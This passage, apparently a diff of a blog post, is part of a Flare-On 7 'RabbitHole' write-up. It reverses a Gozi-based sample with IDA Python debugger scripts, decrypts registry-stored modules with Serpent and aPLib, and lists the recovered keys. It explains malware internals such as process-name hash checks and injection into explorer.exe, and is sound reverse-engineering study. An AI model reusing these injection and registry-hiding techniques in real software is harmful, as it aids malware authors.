+<span class="n">ida_bytes</span><span class="o">.</span><span class="n">patch_bytes</span><span class="p">(</span><span class="n">get_reg_value</span><span class="p">(</span><span class="s2">&#34;rbx&#34;</span><span class="p">)</span><span class="o">+</span><span class="mh">0x1c</span><span class="p">,</span> <span class="n">kevin_SID</span><span class="p">)</span>
+</code></pre></div><p>Then, when it writes the registry path to its own struct, we would need it to navigate it to our HKCU path on the registry, so we need to patch the SID once again, this time, restoring our own SID. Use the following IDA Python code in a conditional breakpoint at <code>0x14000FBCF</code>.</p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="n">original_sid</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;\x.. [Your own SID here] \x..&#34;</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s2">&#34;Restoring SID&#34;</span><span class="p">)</span>
+
+<span class="c1"># Perform a single step because the next instruction is a loop</span>
+<span class="c1"># and we want our code to be called only once</span>
+<span class="n">step_into</span><span class="p">()</span> 
+<span class="n">ida_dbg</span><span class="o">.</span><span class="n">wait_for_next_event</span><span class="p">(</span><span class="n">ida_dbg</span><span class="o">.</span><span class="n">WFNE_SUSP</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="c1"># Get the ptr to the SID</span>
+<span class="n">sid_ptr</span> <span class="o">=</span> <span class="n">get_reg_value</span><span class="p">(</span><span class="s2">&#34;rsi&#34;</span><span class="p">)</span> <span class="o">+</span> <span class="mi">4</span>
+
+<span class="c1"># Patch Kevin&#39;s SID back to ours</span>
+<span class="n">ida_bytes</span><span class="o">.</span><span class="n">patch_bytes</span><span class="p">(</span><span class="n">sid_ptr</span><span class="p">,</span> <span class="n">original_sid</span><span class="p">)</span>
+
+<span class="n">ida_dbg</span><span class="o">.</span><span class="n">continue_process</span><span class="p">()</span>
+</code></pre></div><p>We also added this conditional breakpoint script to <code>0x140010243</code> to print the generated names. This way, we will verify that we succeeded in feeding the program with Kevin&rsquo;s SID when needed.</p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="n">ea</span> <span class="o">=</span> <span class="n">get_reg_value</span><span class="p">(</span><span class="s2">&#34;rax&#34;</span><span class="p">)</span>
+<span class="n">name</span> <span class="o">=</span> <span class="n">get_strlit_contents</span><span class="p">(</span><span class="n">ea</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">STRTYPE_C_16</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;Generated name: {name}&#34;</span><span class="p">)</span>
+</code></pre></div><p>And bingo! When running the program with our conditional breakpoints we can see the following prints:</p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="n">Generated</span> <span class="n">name</span><span class="p">:</span> <span class="sa">b</span><span class="s1">&#39;Timerpro&#39;</span>
+<span class="n">Generated</span> <span class="n">name</span><span class="p">:</span> <span class="sa">b</span><span class="s1">&#39;Languagetheme&#39;</span>
+<span class="n">Generated</span> <span class="n">name</span><span class="p">:</span> <span class="sa">b</span><span class="s1">&#39;Columncurrent&#39;</span>
+<span class="n">Generated</span> <span class="n">name</span><span class="p">:</span> <span class="sa">b</span><span class="s1">&#39;WebsoftwareProcesstemplate&#39;</span>
+</code></pre></div><p>Looking at a tool such as Sysinternals Process Monitor, we can see that these registry keys were accessed successfully.</p>
+<a class="lightgallery" href="/posts/flare-on-7-rabbithole/images/image_19.png" title="/posts/flare-on-7-rabbithole/images/image_19.png" data-thumbnail="/posts/flare-on-7-rabbithole/images/image_19.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="images/image_19.png"
+            data-srcset="/posts/flare-on-7-rabbithole/images/image_19.png, images/image_19.png 1.5x, /posts/flare-on-7-rabbithole/images/image_19.png 2x"
+            data-sizes="auto"
+            alt="/posts/flare-on-7-rabbithole/images/image_19.png" />
+    </a>
+<p>Then, the malware is reading the value of the module from <code>HKCU\SOFTWARE\Timerpro\Languagetheme\WebsoftwareProcesstemplate</code> and decrypt it using the Serpent algorithm. We learned this, by spotting the <code>0x9E3779B9</code> magic value. The program uses Serpent with the following key: <code>90982d21090ef347</code> which was generated by a couple of XOR operations on hard-coded values. After the decryption, we can notice something weird. It seems like the program tries to read from a memory address which is invalid. This should trigger an exception!</p>
+<div class="highlight"><pre class="chroma"><code class="language-asm" data-lang="asm"><span class="err">0</span><span class="nf">x140006251</span> <span class="no">mov</span>     <span class="no">r14d</span><span class="p">,</span> <span class="p">[</span><span class="no">r12</span><span class="p">]</span> <span class="c">; r12 = 0x13B54550BCB280DF
+</span></code></pre></div><p>Yes! Right after this instruction, an exception occurs and transforms the control into the <code>ExceptionHandler</code> function at <code>0x140008918</code>. Thankfully, we have a breakpoint in there.</p>
+<h3 id="injecting-module-to-explorerexe">Injecting module to explorer.exe</h3>
+<p>From a quick look at the exception handler, it looks like the malware has its own handler table that will allow it to operate and catch exceptions even when running as an injected code. Nothing we need to deeply analyze. The program is then continuing and entering the function at <code>0x1400100EC</code> which begins by comparing the hash of our process name (&ldquo;POWERSHELL.EXE&rdquo;) that was stored in the malware&rsquo;s struct, with two hard-coded values</p>
+<div class="highlight"><pre class="chroma"><code class="language-cpp" data-lang="cpp"><span class="n">result</span> <span class="o">=</span> <span class="n">g_key</span> <span class="o">^</span> <span class="n">g_malware_struct</span><span class="o">-&gt;</span><span class="n">filename_hash</span><span class="p">;</span>
+<span class="k">if</span> <span class="p">(</span> <span class="n">result</span> <span class="o">==</span> <span class="mh">0xB966001B</span> <span class="o">||</span> <span class="n">result</span> <span class="o">==</span> <span class="mh">0x6888C63C</span> <span class="p">)</span>
+<span class="p">{</span>
+<span class="p">...</span>
+</code></pre></div><p>It seems like we made a wise decision to name our binary <code>powershell.exe</code> since the hash of <code>POWERSHELL.EXE</code> is <code>0x6888C63C</code> so we successfully pass the check. What is the hash in this comparison? Our hunch told us it is <code>explorer.exe</code> since some of the articles online mentioned that Gozi is injecting its code to <code>explorer.exe</code>.  This can also be verified by implementing the hash algorithm or changing the value of the process name that passed to the function and check them against <code>EXPLORER.EXE</code>.</p>
+<p>After the comparison of the hashes, the malware dynamically loads the <code>GetShellWindow</code> and <code>GetWindowThreadProcessId</code> functions from <code>user32.dll</code>. With this information, the malware preparing the stage for what looks like an injection to explorer.exe. The retrieved results from <code>GetWindowThreadProcessId</code> are used to get a handle to <code>explorer.exe</code> using <code>OpenProcess()</code>. Then, it checks for the presence of a debugger and begins a decryption of the module loaded from the registry (yes, again&hellip;). After the decryption, the instruction at <code>0x14000BB3C</code> is triggering the aPLib decompression method that decompresses the decrypted module from the registry, revealing a known Gozi magic header — <code>PX</code>.</p>
+<a class="lightgallery" href="/posts/flare-on-7-rabbithole/images/image_20.png" title="/posts/flare-on-7-rabbithole/images/image_20.png" data-thumbnail="/posts/flare-on-7-rabbithole/images/image_20.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="images/image_20.png"
+            data-srcset="/posts/flare-on-7-rabbithole/images/image_20.png, images/image_20.png 1.5x, /posts/flare-on-7-rabbithole/images/image_20.png 2x"
+            data-sizes="auto"
+            alt="/posts/flare-on-7-rabbithole/images/image_20.png" />
+    </a>
+<p>The <code>PX</code> byte sequence was mentioned in several articles, and it is the &ldquo;magic bytes&rdquo; for Gozi&rsquo;s costumed executable format. Several researchers even wrote tools to parse and rebuild this executable format into a readable executable. We didn&rsquo;t use it, but we recommend <a href="https://github.com/hasherezade/funky_malware_formats/tree/master/isfb_parser" target="_blank" rel="noopener noreffer">this project</a> for those of you who want to rebuild these modules.</p>
+<p>Now that the module is decrypted and decompressed, the injection to <code>explorer.exe</code> proceeds. The injected module looks very similar to our own shellcode. As such, we can safely rename our binary from <code>powershell.exe</code> to <code>explorer.exe</code> in order to reveal more layers in the malware and skip the messy injection.</p>
+<h3 id="decrypting-all-the-modules-using-serpent-and-aplib">Decrypting all the modules using Serpent and aPLib</h3>
+<p>One thing we understood now (and verified by reading about Gozi online) is that when the modules are being loaded from the registry, they are being parsed to extract an encrypted serpent key embedded in themselves. Then, this key is used to decrypt the module. Finally, the decrypted module is decompressed using aPLib.</p>
+<p>Knowing this, it is possible that we can make the program decrypt the module for us. In essence, if we tell the program to read a different registry key, it will generate the serpent key for this &ldquo;hijacked&rdquo; key, and decrypt it for us. After all, it seems that the module decryption is pretty consistent, so all we need to change is the content that is read from the registry. In fact, we don&rsquo;t even need to make the malware read different registry keys, we can simply replace the content for it just before it is sent to the decryption routine. Then, the right serpent key will be extracted and calculated from it, and we can use it to decrypt and decompress it by ourselves. Cool! Let&rsquo;s do it.</p>
+<p>First, we need to decide on a place in the execution in which we want to replace the content of the loaded module with the content of one of the modules we dumped on the disk (at the beginning of this writeup). In our opinion, a great place to hijack the memory and replace the content of the buffer will be right after the registry of <code>WebsoftwareProcesstemplate</code> is being read, and just before the decryption begins.</p>
+<p>The following code snippet shows that right after the malware reads from the registry, it calls to the decryption function at <code>0x140010828</code>.</p>
+<div class="highlight"><pre class="chroma"><code class="language-asm" data-lang="asm"><span class="na">...</span>
+<span class="err">0</span><span class="nf">x14000520B</span> <span class="no">call</span>  <span class="no">readRegKey</span>   <span class="c">; Read module value from the registry
+</span><span class="c"></span><span class="mi">0x140005210</span> <span class="no">test</span>  <span class="no">eax</span><span class="p">,</span> <span class="no">eax</span>
+<span class="err">0</span><span class="nf">x140005212</span> <span class="no">mov</span>   <span class="no">edi</span><span class="p">,</span> <span class="no">eax</span>
+<span class="err">0</span><span class="nf">x140005214</span> <span class="no">jnz</span>   <span class="no">loc_14000529F</span>
+<span class="err">0</span><span class="nf">x14000521A</span> <span class="no">mov</span>   <span class="no">edx</span><span class="p">,</span> <span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">48</span><span class="no">h</span><span class="err">+</span><span class="no">var_28</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x14000521E</span> <span class="no">test</span>  <span class="no">edx</span><span class="p">,</span> <span class="no">edx</span>
+<span class="err">0</span><span class="nf">x140005220</span> <span class="no">jz</span>    <span class="no">short</span> <span class="no">loc_14000529A</span>
+<span class="err">0</span><span class="nf">x140005222</span> <span class="no">mov</span>   <span class="no">eax</span><span class="p">,</span> <span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">48</span><span class="no">h</span><span class="err">+</span><span class="no">arg_20</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x140005226</span> <span class="no">mov</span>   <span class="no">rbx</span><span class="p">,</span> <span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">48</span><span class="no">h</span><span class="err">+</span><span class="no">var_20</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x14000522B</span> <span class="no">neg</span>   <span class="no">eax</span>
+<span class="err">0</span><span class="nf">x14000522D</span> <span class="no">lea</span>   <span class="no">rax</span><span class="p">,</span> <span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">48</span><span class="no">h</span><span class="err">+</span><span class="no">var_28</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x140005232</span> <span class="no">mov</span>   <span class="no">rcx</span><span class="p">,</span> <span class="no">rbx</span>
+<span class="err">0</span><span class="nf">x140005235</span> <span class="no">sbb</span>   <span class="no">r9</span><span class="p">,</span> <span class="no">r9</span>
+<span class="err">0</span><span class="nf">x140005238</span> <span class="no">and</span>   <span class="no">r9</span><span class="p">,</span> <span class="no">rax</span>
+<span class="err">0</span><span class="nf">x14000523B</span> <span class="no">mov</span>   <span class="no">eax</span><span class="p">,</span> <span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">48</span><span class="no">h</span><span class="err">+</span><span class="no">arg_20</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x14000523F</span> <span class="no">neg</span>   <span class="no">eax</span>
+<span class="err">0</span><span class="nf">x140005241</span> <span class="no">lea</span>   <span class="no">rax</span><span class="p">,</span> <span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">48</span><span class="no">h</span><span class="err">+</span><span class="no">var_18</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x140005246</span> <span class="no">sbb</span>   <span class="no">r8</span><span class="p">,</span> <span class="no">r8</span>
+<span class="err">0</span><span class="nf">x140005249</span> <span class="no">and</span>   <span class="no">r8</span><span class="p">,</span> <span class="no">rax</span>
+<span class="err">0</span><span class="nf">x14000524C</span> <span class="no">call</span>  <span class="no">decryption</span>   <span class="c">; 0x140010828; Decrypt the loaded module
+</span><span class="c"></span><span class="no">...</span>
+</code></pre></div><p>As such, we can place a breakpoint at the beginning of the decryption routine (<code>0x140010828</code>) and replace the content of the module with the content of another module of our choice. Then, we need to find a good place to grab the key from. Such a place is <code>0x14000CDDF</code> as the key of 16-bytes resides in the memory and pointed-to by <code>RDX</code>.</p>
+<p>Now that we have the two locations, we can manually set breakpoints and hijack the loaded module to another module. Doing it manually one by one should be possible, there are only&hellip; 52 REGISTRY KEYS??!</p>
+<p>Oh, wow. Well, maybe doing this manually isn&rsquo;t such a wise idea. Well, some scripting and automation had never scared us! Thankfully, IDA debugger is scriptable and we can write a program that does the following steps for every registry key file that we dumped:</p>
+<ol>
+<li>Load the content of a file</li>
+<li>Start IDA debugger and execute until reaching the beginning of the decryption routine at <code>0x140010828</code></li>
+<li>Replace the content of the loaded module in the memory with the content of our loaded file</li>
+<li>Run until the second time that <code>0x14000CDDF</code> is called</li>
+<li>Save the generated serpent key</li>
+<li>Use this serpent key to decrypt the file we loaded</li>
+<li>Decompress the decrypted file using aPLib</li>
+<li>Save the decrypted file to disk</li>
+<li>Start again with the next file</li>
+</ol>
+<p>Alright, sounds simple, right? Let&rsquo;s do it.</p>
+<p>The following Python script implements the steps we describe above, extracts all the Serpent keys, and uses them to decrypt each of the modules from the registry. The decrypted and decompressed files are then saved to disk:</p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pathlib</span> <span class="kn">import</span> <span class="n">Path</span>
+<span class="kn">from</span> <span class="nn">malduck</span> <span class="kn">import</span> <span class="n">enhex</span><span class="p">,</span> <span class="n">serpent</span><span class="p">,</span> <span class="n">aplib</span>
+
+<span class="n">modules</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;CalTimer.bin&#34;</span><span class="p">,</span>
+    <span class="s2">&#34;Columncurrent/CaclibRegionmap.bin&#34;</span><span class="p">,</span>
+    <span class="s2">&#34;Columncurrent/CalccalcLogicnew.bin&#34;</span><span class="p">,</span>
+    <span class="c1"># ... TRUNCATED FOR READABILITY, FULL SCRIPT AVAILABLE IN THE APPENDIX</span>
+    <span class="s2">&#34;DiMap.bin&#34;</span><span class="p">,</span>
+    <span class="s2">&#34;FalseLanguage.bin&#34;</span><span class="p">,</span>
+    <span class="s2">&#34;Languagetheme/CaclibRegionmap.bin&#34;</span><span class="p">,</span>
+    <span class="c1"># ... </span>
+    <span class="s2">&#34;Languagetheme/WebmodeThemearchive.bin&#34;</span><span class="p">,</span>
+    <span class="s2">&#34;Languagetheme/WebsoftwareProcesstemplate.bin&#34;</span><span class="p">,</span>
+    <span class="s2">&#34;Languagetheme/WordlibSystemser.bin&#34;</span><span class="p">,</span>
+    <span class="s2">&#34;SolutionDat.bin&#34;</span><span class="p">,</span>
+    <span class="s2">&#34;VersiScreen.bin&#34;</span><span class="p">,</span>
+    <span class="s2">&#34;WebFalse.bin&#34;</span><span class="p">,</span>
+    <span class="s2">&#34;WordTimer/MAIN.bin&#34;</span>
+<span class="p">]</span>
+
+<span class="n">output</span> <span class="o">=</span> <span class="n">Path</span><span class="p">(</span><span class="s2">&#34;keys.txt&#34;</span><span class="p">)</span>
+<span class="n">timerpro_path</span> <span class="o">=</span> <span class="s2">&#34;PATH</span><span class="se">\\</span><span class="s2">TO</span><span class="se">\\</span><span class="s2">Timerpro&#34;</span>
+
+<span class="n">decryption_function</span> <span class="o">=</span> <span class="mh">0x140010828</span>
+<span class="n">serpent_key_address</span> <span class="o">=</span> <span class="mh">0x14000CDDF</span>
+
+<span class="c1"># Iterate over all the modules we extracted</span>
+<span class="k">for</span> <span class="n">module</span> <span class="ow">in</span> <span class="n">modules</span><span class="p">:</span>
+    <span class="n">path</span> <span class="o">=</span> <span class="n">Path</span><span class="p">(</span><span class="n">timerpro_path</span><span class="p">,</span> <span class="n">module</span><span class="p">)</span>
+    <span class="c1"># Read the module&#39;s bytes</span>
+    <span class="n">module_bytes</span> <span class="o">=</span> <span class="n">path</span><span class="o">.</span><span class="n">read_bytes</span><span class="p">()</span>
+
+    <span class="c1"># Start execution until the decryption function</span>
+    <span class="n">ida_dbg</span><span class="o">.</span><span class="n">run_to</span><span class="p">(</span><span class="n">decryption_function</span><span class="p">)</span>
+    <span class="c1"># Debugger is async so let&#39;s wait until the process is suspended</span>
+    <span class="n">ida_dbg</span><span class="o">.</span><span class="n">wait_for_next_event</span><span class="p">(</span><span class="n">ida_dbg</span><span class="o">.</span><span class="n">WFNE_SUSP</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+    <span class="c1"># Replace the bytes in the original module (&#34;WebsoftwareProcesstemplate&#34;) with</span>
+    <span class="c1"># those of our loaded module</span>
+    <span class="n">ida_bytes</span><span class="o">.</span><span class="n">patch_bytes</span><span class="p">(</span><span class="n">get_reg_value</span><span class="p">(</span><span class="s2">&#34;rcx&#34;</span><span class="p">),</span> <span class="n">module_bytes</span><span class="p">)</span>
+    <span class="c1"># Set the length of the loaded module</span>
+    <span class="n">set_reg_value</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">module_bytes</span><span class="p">),</span> <span class="s2">&#34;rdx&#34;</span><span class="p">)</span>
+    
+    <span class="c1"># Continue the execution twice until the address of the Serpent key</span>
+    <span class="c1"># is in the memory. The function is called twice, only the second</span>
+    <span class="c1"># time is our key. The first is used for decrypting an RSA key (left out).</span>
+    <span class="n">ida_dbg</span><span class="o">.</span><span class="n">run_to</span><span class="p">(</span><span class="n">serpent_key_address</span><span class="p">)</span>
+    <span class="n">ida_dbg</span><span class="o">.</span><span class="n">wait_for_next_event</span><span class="p">(</span><span class="n">ida_dbg</span><span class="o">.</span><span class="n">WFNE_SUSP</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">ida_dbg</span><span class="o">.</span><span class="n">run_to</span><span class="p">(</span><span class="n">serpent_key_address</span><span class="p">)</span>
+    <span class="n">ida_dbg</span><span class="o">.</span><span class="n">wait_for_next_event</span><span class="p">(</span><span class="n">ida_dbg</span><span class="o">.</span><span class="n">WFNE_SUSP</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+
+    <span class="c1"># Read the serpent key that is pointed by RDX</span>
+    <span class="n">serpent_key</span> <span class="o">=</span> <span class="n">ida_bytes</span><span class="o">.</span><span class="n">get_bytes</span><span class="p">(</span><span class="n">get_reg_value</span><span class="p">(</span><span class="s2">&#34;rdx&#34;</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
+
+    <span class="c1"># Write the module name and its key to a file</span>
+    <span class="k">with</span> <span class="n">output</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;{module} : {enhex(serpent_key).decode()}</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+    
+    <span class="c1"># Some will fail as they aren&#39;t encrypted</span>
+    <span class="k">if</span> <span class="n">serpent_key</span> <span class="o">!=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\xff</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">16</span><span class="p">:</span>
+        <span class="n">bin_path</span> <span class="o">=</span> <span class="n">path</span><span class="o">.</span><span class="n">with_suffix</span><span class="p">(</span><span class="s2">&#34;.dec&#34;</span><span class="p">)</span>
+        <span class="n">decrypted</span> <span class="o">=</span> <span class="n">serpent</span><span class="o">.</span><span class="n">cbc</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">serpent_key</span><span class="p">,</span> <span class="n">module_bytes</span><span class="p">)</span>
+        <span class="c1"># When tested, MAIN looked compressed but the aPLib compression started</span>
+        <span class="c1"># at offset 5 and not at offset 21. Thus, it will get a special treatment</span>
+        <span class="k">if</span> <span class="s2">&#34;MAIN&#34;</span> <span class="ow">in</span> <span class="n">module</span><span class="p">:</span>
+            <span class="n">decompressed</span> <span class="o">=</span> <span class="n">aplib</span><span class="p">(</span><span class="n">decrypted</span><span class="p">[</span><span class="mi">4</span><span class="p">:])</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">decompressed</span> <span class="o">=</span> <span class="n">aplib</span><span class="p">(</span><span class="n">decrypted</span><span class="p">[</span><span class="mi">20</span><span class="p">:])</span>
+        <span class="n">bin_path</span><span class="o">.</span><span class="n">write_bytes</span><span class="p">(</span><span class="n">decompressed</span><span class="p">)</span>
+
+    <span class="c1"># Quit debugging so we can start again</span>
+    <span class="n">ida_dbg</span><span class="o">.</span><span class="n">exit_process</span><span class="p">()</span>
+    <span class="n">ida_dbg</span><span class="o">.</span><span class="n">wait_for_next_event</span><span class="p">(</span><span class="n">ida_dbg</span><span class="o">.</span><span class="n">WFNE_ANY</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+</code></pre></div><p>It takes for IDA about a minute to run over all the files and decrypt them. At the end of the execution, about 35 files will be decrypted and dumped with <code>.dec</code> extension. The others might be interesting but we need to keep in mind that many of them are very very small and likely to contain some runtime and config-related data.</p>
+<p>The following is a list of the registry keys and their serpent key.</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">Columncurrent/CaclibRegionmap.bin : 40b9cbf5a41db7433d655a842a4c493a
+Columncurrent/CalccalcLogicnew.bin : 320f5154ddf2b2b063394556a6c15d3f
+Columncurrent/CalciconLogicthre.bin : 8ab8fa5d748d65f90e27229737342453
+Columncurrent/DatethrWorkscreen.bin : af2e49d8ef09ac7ff527ca9b96dd7bbd
+Columncurrent/DiskproIdbui.bin : 30aad3fa78e199db35f1de283c02b5ad
+Columncurrent/InflibExplorertru.bin : 1f310e05b31c48c893f49ac5d6747ce0
+Columncurrent/PrintsolutSavetheme.bin : 3729562bfd8e30ffec3d10cb35651b27
+Columncurrent/ProtocolmagicWordeskt.bin : 4061b8be98db86a176853fb6c3430e2c
+Columncurrent/RowmapGuiprotocol.bin : aef62f8621332800a1eb9fde710f9e96
+Columncurrent/ScreenserProtocolacces.bin : 20279a69506ce52161f08f08e0b50fee
+Columncurrent/SoflogicMagiclink.bin : ffffffffffffffffffffffffffffffff
+Columncurrent/TasknetCharconso.bin : 336081c848bf432cc998ba0f67e664b5
+Columncurrent/ThemespellDaytheme.bin : 900bc4af9a04bf36e94daeb706805334
+Columncurrent/TimermagSelink.bin : 3df0b388dff182b0cc024cfd96fab271
+Columncurrent/WebmodeThemearchive.bin : 2d4ece0c61be29495e9d3cf49ab7a940
+Columncurrent/WebsoftwareProcesstemplate.bin : ffffffffffffffffffffffffffffffff
+Columncurrent/WordlibSystemser.bin : 040e3a048a31ff8d0cebba79ab708c72
+
+Languagetheme/CaclibRegionmap.bin : 346f5a5346a6eec7a4b17e721e83dfd8
+Languagetheme/CalccalcLogicnew.bin : cc1ce8c86de66dfbb5f8e8df396d8bad
+Languagetheme/DatethrWorkscreen.bin : ffd057c8ef03d60ecf900627601537f8
+Languagetheme/InfspellTimerver.bin : e0de6b4426e4b7c643a2b5082d4cc2b8
+Languagetheme/KeyboardtimerWolib.bin : 6c2402cdee6e3cca2235ee9a52183bbe
+Languagetheme/MonitornewWarningmap.bin : fb44d53d3c930f5972eac371c8072ccc
+Languagetheme/NewinRegionsea.bin : 17412b95755409dffaf2482404b679b9
+Languagetheme/PrintsolutSavetheme.bin : 0b1d83c68c274376274ebd6dc1157cd8
+Languagetheme/ProcesscharProtocomedia.bin : f64c708e53387d4e3846053cc474be7d
+Languagetheme/ProtocolmagicWordeskt.bin : cce54d85d5e0f74f5f1232b4f252af42
+Languagetheme/RowmapGuiprotocol.bin : f80d0bbd27fabcdc5f3a1734e9c600a5
+Languagetheme/ScreenserProtocolacces.bin : 8ecf714bc7c5893c197120e4f17808c3
+Languagetheme/SoflogicMagiclink.bin : ffffffffffffffffffffffffffffffff
+Languagetheme/ThemespellDaytheme.bin : 4ab378dbd457818a765f6c6046c4b9fb
+Languagetheme/ThemewebInnet.bin : 7f340870de5285a814419d1e446b67c7
+Languagetheme/TimerscreenClientsecur.bin : 74f614cd91afc160015688ffd0e20fec
+Languagetheme/WebmodeThemearchive.bin : b62991a7c69104f27cdd94a3c75d0955
+Languagetheme/WebsoftwareProcesstemplate.bin : d4b4cd76c4d25639144150e37cd8d23a
+Languagetheme/WordlibSystemser.bin : 6155c210d8834cccb545f79f3a2b5ae1
+
+WordTimer/MAIN.bin : 5ab9afa4a2dce9c9ded6fcefe3be5844
+
+CalTimer.bin : ffffffffffffffffffffffffffffffff
+CurrentByte.bin : ffffffffffffffffffffffffffffffff
+DatNew.bin : ffffffffffffffffffffffffffffffff
+DayOld.bin : ffffffffffffffffffffffffffffffff
+D.bin : ffffffffffffffffffffffffffffffff
+DiMap.bin : ffffffffffffffffffffffffffffffff
+FalseLanguage.bin : ffffffffffffffffffffffffffffffff
+ScaleThr.bin : ffffffffffffffffffffffffffffffff
+ScreenWeb.bin : ffffffffffffffffffffffffffffffff
+SoftwareColumn.bin : ffffffffffffffffffffffffffffffff
+SolutionDat.bin : ffffffffffffffffffffffffffffffff
+ThemeDay.bin : ffffffffffffffffffffffffffffffff
+TimerVersion.bin : ffffffffffffffffffffffffffffffff
+VersiScreen.bin : ffffffffffffffffffffffffffffffff
+WebFalse.bin : ffffffffffffffffffffffffffffffff
+</code></pre></div><p>This is also a great opportunity to move some parts of this script to be a conditional breakpoint. Specifically, it would be great if IDA will print the generated Serpent key every time the program generates a key. To do this, we take some of the code above and add it to a conditional breakpoint at <code>0x14000CDDF</code>:</p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="c1"># Read the serpent key that is pointed by RDX</span>
+<span class="n">serpent_key</span> <span class="o">=</span> <span class="n">ida_bytes</span><span class="o">.</span><span class="n">get_bytes</span><span class="p">(</span><span class="n">get_reg_value</span><span class="p">(</span><span class="s2">&#34;rdx&#34;</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;Serpent key: {serpent_key}&#34;</span><span class="p">)</span>
+</code></pre></div><p>Every time that a serpent key will be generated, it will be printed to the screen.</p>
+<h2 id="where-is-my-flag">Where is my flag?</h2>
+<p>Now that we have decrypted all the modules and other files, we can triage them by running some static tools and retrieve valuable information. The first thing to do in such cases is to try our luck and check whether we decrypted something which isn&rsquo;t the PX file format (Gozi custom DLL format). There is a chance that we just decrypted an image or a gif file that will hold the flag, right? We executed the <code>file</code> command on all the decrypted modules, but with no luck — all of them were not detected as a known format. Okay, what else? Let&rsquo;s give it a VERY long shot and check if one of them contains a flag. Alright, grepping for <code>flare</code> in 3, 2, 1&hellip;</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ grep -ir <span class="s1">&#39;flare&#39;</span> .
+$
+</code></pre></div><p>Nothing :-(</p>
+<p>Maybe grepping for &ldquo;flag&rdquo;?</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ grep -ir <span class="s1">&#39;flag&#39;</span> .
+Binary file ./WordTimer/MAIN.dec matches
+</code></pre></div><a class="lightgallery" href="/posts/flare-on-7-rabbithole/images/amazed_cat.gif" title="/posts/flare-on-7-rabbithole/images/amazed_cat.gif" data-thumbnail="/posts/flare-on-7-rabbithole/images/amazed_cat.gif">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="images/amazed_cat.gif"
+            data-srcset="/posts/flare-on-7-rabbithole/images/amazed_cat.gif, images/amazed_cat.gif 1.5x, /posts/flare-on-7-rabbithole/images/amazed_cat.gif 2x"
+            data-sizes="auto"
+            alt="/posts/flare-on-7-rabbithole/images/amazed_cat.gif" />
+    </a>
+<p>Wait, what?! Did we just get the flag? Hell yeah!</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ xxd WordTimer/MAIN.dec 
+00000000: <span class="m">0900</span> <span class="m">0000</span> 666c <span class="m">6167</span> 2e74 <span class="m">7874</span> <span class="m">0005</span> <span class="m">0000</span>  ....flag.txt....
+00000010: <span class="m">0046</span> 494c <span class="m">4500</span> <span class="m">0100</span> <span class="m">0000</span> <span class="m">0001</span> <span class="m">0000</span> <span class="m">0000</span>  .FILE...........
+00000020: <span class="m">0100</span> <span class="m">0000</span> <span class="m">0001</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span>  ................
+00000030: <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span>  ................
+00000040: <span class="m">0000</span>
+</code></pre></div><p>Or&hellip; nope. No flag for us. But what is this file? It seems to point to a file that contains the flag, and maybe was stolen from Kevin&rsquo;s computer. Even if we don&rsquo;t have the flag yet, we might know at least the name of the stolen file.</p>
